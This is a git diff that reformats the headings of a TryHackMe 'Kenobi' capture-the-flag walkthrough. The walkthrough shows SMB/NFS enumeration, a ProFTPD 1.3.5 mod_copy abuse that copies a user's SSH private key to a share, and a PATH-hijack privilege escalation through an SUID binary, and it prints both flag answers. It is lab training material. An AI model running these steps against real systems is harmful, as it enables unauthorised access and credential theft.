@@ -6,7 +6,7 @@
 
 <div align="center"> <img alt="Difficulty: Easy" src="https://img.shields.io/badge/Difficulty-Easy-brightgreen" /> <img alt="OS: Linux" src="https://img.shields.io/badge/OS-Linux-blue" /> </div>
 
-## Task 1. Deploy the vulnerable machine
+### Task 1. Deploy the vulnerable machine
 
 <div align="center">
 <img src="https://i.imgur.com/OcA2KrK.gif" height="200"></img>
@@ -15,11 +15,11 @@
 This room will cover accessing a Samba share, manipulating a vulnerable version of proftpd to gain initial access and escalate your privileges to root via an SUID binary.
 Answer the questions below
 
-### Scan the machine with nmap, how many ports are open?
+#### Scan the machine with nmap, how many ports are open?
 ```
 7
 ```
-## Task 2.Enumerating
+### Task 2.Enumerating
 
 <div align="center">
 <img src="https://i.imgur.com/O8S93Kr.png" height="200" width=300"></img>
@@ -29,54 +29,54 @@ Samba is the standard Windows interoperability suite of programs for Linux and U
 
 Samba is based on the common client/server protocol of Server Message Block (SMB). SMB is developed only for Windows, without Samba, other computer platforms would be isolated from Windows machines, even if they were part of the same network.
 
-### Using the nmap command above, how many shares have been found?
+#### Using the nmap command above, how many shares have been found?
 ```
 3
 ```
-### Once you're connected, list the files on the share. What is the file can you see?
+#### Once you're connected, list the files on the share. What is the file can you see?
 ```
 log.txt
 ```
-### What port is FTP running on?
+#### What port is FTP running on?
 ```
 21
 ```
-### What mount can we see?
+#### What mount can we see?
 ```
 /var
 ```
-## Task 3. Gain initial access with ProFtpd
+### Task 3. Gain initial access with ProFtpd
 
 <div align="center">
 <img src="https://i.imgur.com/L54MBzX.png" height=""></img>
 </div>
 
-### What is the version?
+#### What is the version?
 ```
 1.3.5
 ```
-### How many exploits are there for the ProFTPd running?
+#### How many exploits are there for the ProFTPd running?
 ```
 4
 ```
-### What is Kenobi's user flag (/home/kenobi/user.txt)?
+#### What is Kenobi's user flag (/home/kenobi/user.txt)?
 ```
 d0b0f3f53b6caa532a83915e19224899
 ```
-## Task 4. Privilege Escalation with Path Variable Manipulation
-### What file looks particularly out of the ordinary? 
+### Task 4. Privilege Escalation with Path Variable Manipulation
+#### What file looks particularly out of the ordinary? 
 ```
 3
 ```
-### Run the binary, how many options appear?
+#### Run the binary, how many options appear?
 ```
 /usr/bin/menu
 ```
-### What is the root flag (/root/root.txt)?
+#### What is the root flag (/root/root.txt)?
 ```
 177b3cd8562289f37382721c28381f02
 ```
-# Let start Scanning The Network
+## Let start Scanning The Network
 
 ```
 └─$ nmap 10.10.101.17 -sV -Pn                                                
@@ -100,7 +100,7 @@ Nmap done: 1 IP address (1 host up) scanned in 15.70 seconds
 ```
 * #### Total 7 ports are open. 
 
-#### As Smb is open let enumerate it using nmap,```nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse IP```
+##### As Smb is open let enumerate it using nmap,```nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse IP```
 ```
 └─$ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.101.17
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-28 11:21 IST
@@ -162,7 +162,7 @@ smb: \>
 * #### After reading log.txt I found few interesting things.
 * ##### Information generated for Kenobi when generating an SSH key for the user
 * ##### Information about the ProFTPD server running on port 21.
-#### Earlier nmap port scan will have shown port 111 running the service rpcbind. This is just a server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve. In our case, port 111 is access to a network file system. Lets use nmap to enumerate this.
+##### Earlier nmap port scan will have shown port 111 running the service rpcbind. This is just a server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve. In our case, port 111 is access to a network file system. Lets use nmap to enumerate this.
 
 ```
 └─$ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.101.17
@@ -194,15 +194,15 @@ PORT    STATE SERVICE
 
 Nmap done: 1 IP address (1 host up) scanned in 4.60 seconds
 ```
-#### We can see a var mount here
+##### We can see a var mount here
 
-### According to provided info, Let try banner grabbing to get ftp version.
+#### According to provided info, Let try banner grabbing to get ftp version.
 ```
 └─$ nc 10.10.101.17 21
 220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.101.17]
 ```
 
-### Let Search for any Exploit for this version.
+#### Let Search for any Exploit for this version.
 ```
 └─$ searchsploit ProFTPD 1.3.5
 --------------------------------------------------------------------------- ---------------------------------
@@ -215,9 +215,9 @@ ProFTPd 1.3.5 - File Copy                                                  | lin
 --------------------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
 ```
-### As i read about The mod_copy module implements SITE CPFR and SITE CPTO commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.
+#### As i read about The mod_copy module implements SITE CPFR and SITE CPTO commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.
 
-### So just copy the ssh key to var
+#### So just copy the ssh key to var
 ```
  nc 10.10.101.17 21
 ```
@@ -236,7 +236,7 @@ SITE CPTO /var/tmp/id_rsa
 250 Copy successful
 ```
 
-### We knew that the /var directory was a mount, Lets mount the /var/tmp directory to our machine.
+#### We knew that the /var directory was a mount, Lets mount the /var/tmp directory to our machine.
 ```
 mkdir /mnt/kenobiNFS
 ```
@@ -246,16 +246,16 @@ mount 10.10.101.17:/var /mnt/kenobiNFS
 ```
 ls -la /mnt/kenobiNFS
 ```
-### If u get any error doing this just install ```showmount``` command and all it pkg will start downloading with it.
-### Copy [id_rsa](https://github.com/Esther7171/THM-Walkthroughs/blob/main/Room/Kenobi/id_rsa.md)
+#### If u get any error doing this just install ```showmount``` command and all it pkg will start downloading with it.
+#### Copy [id_rsa](https://github.com/Esther7171/THM-Walkthroughs/blob/main/Room/Kenobi/id_rsa.md)
 ```
 cp /mnt/kenobiNFS/tmp/id_rsa .
 ```
-### Change the permissions using chmod:
+#### Change the permissions using chmod:
 ```
 chmod 600 id_rsa
 ```
-### Let log In using SSH
+#### Let log In using SSH
 ```
 ssh kenobi@Ip -i id_rsa
 ```
@@ -277,16 +277,16 @@ See "man sudo_root" for details.
 
 kenobi@kenobi:~$ 
 ```
-## User Flag
+### User Flag
 ```
 kenobi@kenobi:~$ cat user.txt 
 d0b0f3f53b6caa532a83915e19224899
 ```
-## Post Exploitation
+### Post Exploitation
 ```
 find / -perm -u=s -type f 2>/dev/null
 ```
-### This is odd
+#### This is odd
 ```
 kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null
 /sbin/mount.nfs
@@ -317,7 +317,7 @@ kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null
 ```
 /usr/bin/menu
 ```
-### Let run this
+#### Let run this
 ```
 /usr/bin/menu
 ```
@@ -330,7 +330,7 @@ kenobi@kenobi:~$ /usr/bin/menu
 3. ifconfig
 ** Enter your choice :
 ```
-### We need to manipulating the path to gain a root shell as usual
+#### We need to manipulating the path to gain a root shell as usual
 ```
 cd /tmp
 ```
@@ -361,7 +361,7 @@ kenobi@kenobi:/tmp$ /usr/bin/menu
 # 
 ```
 
-## Root Flag
+### Root Flag
 ```
 # cat /root/root.txt
 177b3cd8562289f37382721c28381f02
